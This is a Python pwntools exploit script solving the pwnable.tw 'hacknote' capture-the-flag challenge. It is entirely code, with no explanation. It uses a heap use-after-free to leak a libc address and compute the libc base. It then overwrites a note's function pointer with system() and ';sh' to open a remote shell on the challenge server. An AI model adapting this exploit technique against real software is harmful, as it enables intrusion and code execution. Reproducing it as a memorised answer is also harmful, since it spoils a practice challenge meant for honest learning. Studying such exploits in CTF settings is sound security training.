#Exploit for pwnable.tw/hacknote
from pwn import *

target = remote('chall.pwnable.tw', 10102)
#target = process(['./hacknote', './ld-2.23.so'], env={"LD_PRELOAD":"./libc_32.so.6"})
libc = ELF('./libc_32.so.6')

def sa(string, data):
	print target.sendafter(string, data)
	
def sla(string, data):
	print target.sendlineafter(string, data)
	
def add(size, data):
	sla("choice :", "1")
	sla("size :", str(size))
	sa("Content :", data)
	
def delete(idx):
	sla("choice :", "2")
	sla("Index :", str(idx))
	
def show(idx):
	sla("choice :", "3")
	sla("Index :", str(idx))

add(0x120, "0")
add(0x120, "1")
delete(0)
add(0x120, '\x68')
show(2)
malloc_hook = u32(target.recvline()[:4])
print hex(malloc_hook)
libc_base = malloc_hook - libc.sym['__malloc_hook']
print hex(libc_base)

delete(1)
delete(2)
#add(8, p32(0x08048a99))		--> This address is getting executed
add(9, p32(libc_base + libc.sym['system']) + ';sh\x00')
show(1)
target.interactive()

